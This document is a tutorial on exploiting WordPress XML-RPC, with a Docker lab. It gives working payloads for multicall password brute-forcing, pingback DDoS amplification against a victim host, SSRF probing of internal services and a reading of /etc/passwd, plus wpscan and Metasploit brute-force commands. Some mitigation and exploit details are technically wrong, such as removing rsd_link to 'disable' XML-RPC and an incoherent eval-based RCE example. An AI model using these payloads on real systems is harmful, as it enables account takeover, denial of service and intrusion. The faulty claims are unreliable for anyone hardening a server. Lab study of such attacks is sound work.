## XML-RPC vulnerability   
XML-RPC (Extensible Markup Language Remote Procedure Call) is a protocol that allows software running on different operating systems to communicate over the internet using XML-based messages. It uses HTTP as a transport and XML to encode its calls.  

###  **Key Features of XML-RPC:**  
- **Uses XML:** Data is sent in XML format.  
- **Uses HTTP:** Communicates over HTTP, making it simple and firewall-friendly.  
- **Lightweight:** Compared to SOAP, it is easier to implement.  
- **Remote Procedure Calls:** Enables invoking functions on a remote server.  

###  **Example XML-RPC Request:**  
A client sends an XML request to call the `addNumbers` function with two parameters (5 and 10):  

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>addNumbers</methodName>
  <params>
    <param>
      <value><int>5</int></value>
    </param>
    <param>
      <value><int>10</int></value>
    </param>
  </params>
</methodCall>
```

###  **Example XML-RPC Response:**  
The server responds with an XML-formatted result:  

```xml
<?xml version="1.0"?>
<methodResponse>
  <params>
    <param>
      <value><int>15</int></value>
    </param>
  </params>
</methodResponse>
```

###  **Common Uses of XML-RPC:**  
- WordPress and other CMS platforms use it for remote management.  
- Used in older APIs before REST and GraphQL became popular.  
- Communication between different systems in distributed applications.  

###  **Security Risks & Hardening:**  
XML-RPC can be exploited in various ways, especially in WordPress, where attackers use it for **brute-force attacks** or **DDoS via pingbacks**.  
####  Hardening Tips:  
- **Disable XML-RPC if not needed** (especially in WordPress).  
- **Use a Web Application Firewall (WAF)** to filter requests.  
- **Rate-limit XML-RPC requests** to prevent abuse.  
- **Allow-list trusted IPs** if XML-RPC is necessary.  



XML-RPC has several security vulnerabilities that attackers can exploit. Here are the most common ones:  

---

##  **1. Brute Force Attacks (WordPress Login Bruteforce)**  
###  **Issue:**  
In WordPress, XML-RPC allows **system.multicall**, which lets attackers send multiple authentication attempts in a **single request**. This makes brute force attacks much faster than traditional login attempts.

###  **Exploit:**  
An attacker can use a single request to test multiple username/password combinations:  

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>admin</string></value>
                        <value><string>password123</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
            <!-- Repeat with different password guesses -->
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
```

###  **Mitigation:**  
- Disable XML-RPC if not needed (`remove_action('wp_head', 'rsd_link');`).  
- Use **fail2ban** to detect and block brute-force attempts.  
- Install WordPress security plugins like **Wordfence** to block XML-RPC attacks.  

---

##  **2. DDoS via Pingback (Amplification Attack)**  
###  **Issue:**  
Attackers can abuse the **pingback feature** in XML-RPC to send massive requests to a victim server, leading to **DDoS amplification**.

###  **Exploit:**  
An attacker sends a request to a vulnerable WordPress site, asking it to send a pingback to a victim’s server:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>http://victim-site.com</string></value>
    </param>
    <param>
      <value><string>http://attacker-site.com</string></value>
    </param>
  </params>
</methodCall>
```

This makes **thousands of WordPress sites** attack the **victim** with unwanted traffic.  

###  **Mitigation:**  
- Disable **pingbacks** using the following in `functions.php`:
  ```php
  add_filter('xmlrpc_enabled', '__return_false');
  ```
- Use **mod_security** or a **WAF (Cloudflare, Sucuri)** to filter XML-RPC requests.  
- Monitor for unusual traffic in server logs.  

---

##  **3. Server-Side Request Forgery (SSRF) via XML-RPC**  
###  **Issue:**  
XML-RPC can be used to **force the server to make requests to internal resources**, exposing **local files**, **metadata**, or even allowing internal scans.

###  **Exploit:**  
Using `pingback.ping`, an attacker can request internal services:  

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>http://internal-service.local</string></value>
    </param>
    <param>
      <value><string>http://attacker.com</string></value>
    </param>
  </params>
</methodCall>
```

If the internal service responds, it confirms its existence. This can be used for **port scanning**, **internal enumeration**, or even **retrieving AWS metadata** in cloud environments.

###  **Mitigation:**  
- Block external requests from the webserver using `iptables` or `cloud security groups`.  
- Disable XML-RPC if not needed.  
- Implement proper **outbound traffic filtering**.  

---

##  **4. Remote Code Execution (RCE) via XML-RPC**  
###  **Issue:**  
If a vulnerable XML-RPC implementation doesn’t properly sanitize input, an attacker may execute arbitrary system commands.

###  **Exploit (Example in PHP):**  
A vulnerable PHP script that directly evaluates user input:

```php
eval($xmlrpc_request);
```

An attacker could craft a malicious XML payload to execute system commands:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system</methodName>
  <params>
    <param>
      <value><string>cat /etc/passwd</string></value>
    </param>
  </params>
</methodCall>
```

###  **Mitigation:**  
- Avoid using `eval()` or unsafe deserialization of XML-RPC input.  
- Use **input validation and sanitization** to prevent malicious execution.  
- Use **SELinux/AppArmor** to restrict system command execution.  

---

##  **5. Information Disclosure via Error Messages**  
###  **Issue:**  
Improper error handling in XML-RPC responses can reveal sensitive server information, including:  
- PHP version  
- WordPress version  
- Database errors  

###  **Exploit:**  
Sending a malformed request might leak sensitive information:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>invalidFunction</methodName>
</methodCall>
```

If the server responds with:

```
Fault Code: 32601
Fault String: Requested method invalidFunction does not exist
```

An attacker might infer that XML-RPC is enabled and proceed with further attacks.

###  **Mitigation:**  
- Configure **error suppression** in production (`display_errors = Off`).  
- Use **custom error messages** to prevent information leaks.  
- Monitor logs for repeated **invalid XML-RPC requests**.  

---

##  **How to Check if XML-RPC is Enabled?**  
Run the following **cURL command**:

```sh
curl -X POST -d '<methodCall><methodName>wp.getUsersBlogs</methodName></methodCall>' http://example.com/xmlrpc.php
```
or
```sh
curl -X POST -d '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' -H 'Content-Type: text/xml' 'https://site-url-example/xmlrpc.php'
```
If XML-RPC is enabled, it will return a valid response.  

---

##  **Tools for Exploiting XML-RPC Vulnerabilities**  
- **wpscan** – WordPress security scanner (`wpscan --url example.com --enumerate u`)
- **Metasploit** – WordPress XML-RPC brute-force module (`auxiliary/scanner/http/wordpress_xmlrpc_login`)
- **Burp Suite** – Intercept XML-RPC traffic and modify requests  

---

##  **Final Recommendations**  
- **Disable XML-RPC** if not required.  
- Use **WAF (Cloudflare, ModSecurity, or Sucuri)** to filter XML-RPC requests.  
- **Rate-limit XML-RPC requests** to prevent brute force and DDoS attacks.  
- Regularly **monitor server logs** for unusual XML-RPC traffic.  

---
To set up a **test lab for XML-RPC vulnerabilities**, we'll create a local environment with a vulnerable WordPress installation and use tools to exploit its XML-RPC interface.

---

## ** Lab Setup:**
We'll set up:
- **WordPress with XML-RPC enabled** (using Docker)
- **Metasploit, WPScan, and Burp Suite** for exploitation
- **Fail2Ban and ModSecurity** for mitigation testing

---

### **Step 1: Install Docker & Docker-Compose**
If you haven't installed Docker, do it first:

```sh
sudo apt update && sudo apt install -y docker.io docker-compose
```

---

### **Step 2: Create a Docker Compose File**
Create a new file `docker-compose.yml`:

```yaml
version: '3.1'

services:
  wordpress:
    image: wordpress
    restart: always
    ports:
      - "8080:80"
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: wpuser
      WORDPRESS_DB_PASSWORD: wppass
      WORDPRESS_DB_NAME: wpdb
    volumes:
      - ./wordpress:/var/www/html

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: wpdb
      MYSQL_USER: wpuser
      MYSQL_PASSWORD: wppass
      MYSQL_ROOT_PASSWORD: rootpass
    volumes:
      - ./db_data:/var/lib/mysql
```

Start the containers:

```sh
docker-compose up -d
```

Once running, access **http://localhost:8080** to set up WordPress.

---

### **Step 3: Enable XML-RPC**
WordPress enables XML-RPC by default, but to verify:

1. Login to WordPress Admin (`http://localhost:8080/wp-admin`)
2. Go to **Settings → Writing**
3. Ensure **"Enable XML-RPC"** is turned **ON**.

---

### **Step 4: Check if XML-RPC is Enabled**
Run:

```sh
curl -X POST http://localhost:8080/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```

If enabled, it will return a list of available methods.

---

## ** Exploiting XML-RPC**
### **1️) Brute Force Attack**
Using **WPScan** to brute-force credentials via XML-RPC:

```sh
wpscan --url http://localhost:8080 --usernames admin --passwords rockyou.txt --xmlrpc
```

---

### **2️) DDoS Amplification Attack**
Run this with **Burp Suite or Python** to abuse `pingback.ping`:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>http://victim.com</string></value>
    </param>
    <param>
      <value><string>http://localhost:8080</string></value>
    </param>
  </params>
</methodCall>
```

This causes WordPress to attack `victim.com`.

---

### **3️) SSRF via XML-RPC**
Test internal services:

```sh
curl -X POST http://localhost:8080/xmlrpc.php -d '<methodCall><methodName>pingback.ping</methodName><params><param><value>http://127.0.0.1:22</value></param><param><value>http://attacker.com</value></param></params></methodCall>'
```

If you get an error, the service exists.

---

### **4️) Metasploit - XML-RPC Exploits**
Launch **Metasploit**:

```sh
msfconsole
```

Use **WordPress XML-RPC login scanner**:

```sh
use auxiliary/scanner/http/wordpress_xmlrpc_login
set RHOSTS localhost
set RPORT 8080
set USERNAME admin
set PASSWORD_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## ** Mitigations**
### **Disable XML-RPC**
In `functions.php`:

```php
add_filter('xmlrpc_enabled', '__return_false');
```
---

